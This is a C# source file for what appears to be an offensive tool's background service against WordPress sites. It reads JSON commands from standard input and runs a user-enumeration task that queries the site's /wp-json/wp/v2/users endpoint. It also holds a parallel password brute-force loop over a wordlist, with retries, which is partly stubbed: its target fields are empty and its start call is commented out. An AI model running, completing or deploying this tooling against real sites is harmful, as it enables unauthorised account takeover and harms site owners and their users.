using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;
using Newtonsoft.Json;

namespace react_background_service
{
    class Program
    {
        public static readonly List<Task> ProcessList = new List<Task>();
        
        public static void SendStatus()
        {
            Console.WriteLine(JsonConvert.SerializeObject(ProcessList));
        }
        
        static System.Threading.Tasks.Task Main(string[] args)
        {
            while (true)
            {
                var command = Console.ReadLine();

                if (command != null)
                {
                    var action = JsonConvert.DeserializeObject<Task>(command);

                    if (action.MessageAction == Task.Action.Add)
                    {
                        var id = 0;
                        if (ProcessList.Count > 0)
                        {
                            id = ProcessList.Select(item => item.Id).Prepend(id).Max();
                        }
                        
                        ProcessList.Add(new Task()
                        {
                            Id = id + 1,
                            Name = action.Name,
                            Percentage = 0,
                            Url = action.Url,
                            TaskStatus = Task.Status.Starting,
                            TaskType = action.TaskType,
                            MessageAction = Task.Action.Ping,
                            TaskResult = new Result()
                            {
                                UserEnumeration = new List<UserObj>(), 
                                BruteForce = new LoginCredentials()
                            }
                        });

                        SendStatus();

                        // USER ENUMERATION
                        if (action.TaskType == Task.Type.Enumeration)
                        {
                            var enumTask = new System.Threading.Tasks.Task(async () =>
                            {
                                // ToDo: [enumTask Task Cancellation]
                                var index = ProcessList.FindIndex(a => a.Id == id + 1);
                                var process = ProcessList[index];

                                ProcessList[index].TaskStatus = Task.Status.Running;

                                var client = new HttpClient();
                                var response = await client.GetAsync(process.Url + "/wp-json/wp/v2/users");
                                response.EnsureSuccessStatusCode();
                                var responseBody = await response.Content.ReadAsStringAsync();
                                var list = JsonConvert.DeserializeObject<List<UserObj>>(responseBody);

                                // save result
                                ProcessList[index].TaskResult.UserEnumeration = list;

                                // update task status
                                ProcessList[index].TaskStatus = Task.Status.Ready;
                                ProcessList[index].Percentage = 100;

                                SendStatus();
                            });
                            enumTask.Start();
                        }
                    }
                    
                    // BRUTE FORCE ATTACK
                    if (action.TaskType == Task.Type.BruteForce)
                    {
                        var bruteTask = new System.Threading.Tasks.Task(() =>
                        {
                            // ToDo: [bruteTask Task Cancellation]
                            var uri = "";
                            var username = "";
                            var wordListPath = "";
                            var maxThreads = 0;
                            var batchCount = 0;
                            var retryCount = 0;
                            var outFilePath = "";
                            var found = false;
                            var watch = Stopwatch.StartNew();

                            var la = new LoginAttempt(new Uri(uri));
                            using var sr = new StreamReader(wordListPath);

                            void update(decimal percentage, long seconds)
                            {
                                var remaining = TimeSpan.FromSeconds(seconds);
                                var progress = $"{percentage * 100:0.0000}";
                            }

                            while (!sr.EndOfStream)
                            {
                                var buffer = new List<string>();
                                for (var i = 0; i < batchCount; i++)
                                {
                                    buffer.Add(sr.ReadLine());
                                }

                                var percentage = (decimal)sr.BaseStream.Position / sr.BaseStream.Length;
                                var percentsPerSecond = percentage / (decimal)watch.Elapsed.TotalSeconds;
                                var remainingSeconds = (long)((1 - percentage) / percentsPerSecond);
                                update(percentage, remainingSeconds);

                                Parallel.ForEach(buffer, new ParallelOptions { MaxDegreeOfParallelism = maxThreads },
                                    password =>
                                    {
                                        var currentRetry = 0;

                                        for (; ; ) // retry pattern
                                        {
                                            try
                                            {
                                                if (!la.LoginAttemptAsync(username, password).GetAwaiter().GetResult()) return;

                                                // password found!
                                                found = true;

                                                break;
                                            }
                                            // in case the login attempt fails.
                                            // ToDo: [Brute Force Exception handler] Keep trying if the exception may be temporary. Stop trying if not.
                                            catch
                                            {
                                                currentRetry++;

                                                if (currentRetry > retryCount)
                                                {
                                                    break; // not work, stop trying
                                                }

                                                Thread.Sleep(1000 * currentRetry);
                                            }
                                        }
                                    });

                                if (found) return;
                            }

                            if (found) return;

                            // Password not found!

                        });
                        //bruteTask.Start();
                    }

                    if (action.MessageAction == Task.Action.Remove)
                    {
                        var item = ProcessList.SingleOrDefault(x => x.Id == action.Id);
                        if (item != null) ProcessList.Remove(item);
                    }

                    if (action.MessageAction == Task.Action.Ping)
                    {
                        SendStatus();
                    }
                }
            }
        }
    }
}
